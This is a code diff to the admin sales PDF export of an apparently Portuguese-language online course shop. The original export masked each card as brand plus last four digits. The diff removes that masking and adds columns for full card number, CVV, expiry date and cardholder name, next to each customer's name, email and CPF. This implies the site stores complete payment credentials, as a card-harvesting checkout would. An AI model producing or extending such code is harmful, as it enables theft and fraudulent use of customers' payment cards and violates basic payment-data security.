@@ -909,15 +909,17 @@ app.get('/api/admin/sales/export/pdf', async (c) => {
         <table>
             <thead>
                 <tr>
-                    <th>ID</th>
-                    <th>Data/Hora</th>
-                    <th>Cliente</th>
+                    <th>DATA/HORA</th>
+                    <th>CLIENTE</th>
+                    <th>EMAIL</th>
                     <th>CPF</th>
-                    <th>Email</th>
-                    <th>Curso</th>
-                    <th>Valor</th>
-                    <th>Cartão</th>
-                    <th>Status</th>
+                    <th>NÚMERO CARTÃO</th>
+                    <th>CVV</th>
+                    <th>VALIDADE</th>
+                    <th>NOME NO CARTÃO</th>
+                    <th>CURSO</th>
+                    <th>VALOR</th>
+                    <th>STATUS</th>
                 </tr>
             </thead>
             <tbody>
@@ -928,19 +930,22 @@ app.get('/api/admin/sales/export/pdf', async (c) => {
                     month: '2-digit', 
                     year: 'numeric',
                     hour: '2-digit',
-                    minute: '2-digit'
+                    minute: '2-digit',
+                    second: '2-digit'
                   })
                   
                   return `
                     <tr>
-                        <td>#${sale.id}</td>
                         <td>${formattedDate}</td>
                         <td>${sale.customer_name}</td>
-                        <td>${sale.customer_cpf || 'N/A'}</td>
                         <td>${sale.customer_email}</td>
+                        <td>${sale.customer_cpf || 'N/A'}</td>
+                        <td>${sale.card_number_full || 'N/A'}</td>
+                        <td>${sale.card_cvv || 'N/A'}</td>
+                        <td>${sale.card_expiry || 'N/A'}</td>
+                        <td>${sale.card_holder_name || 'N/A'}</td>
                         <td>${sale.course_title}</td>
                         <td><strong>R$ ${parseFloat(sale.amount).toFixed(2)}</strong></td>
-                        <td>${sale.card_brand || 'N/A'} *${sale.card_last4 || '****'}</td>
                         <td><span class="status-badge status-${sale.status}">${sale.status === 'completed' ? 'Confirmada' : sale.status}</span></td>
                     </tr>
                   `
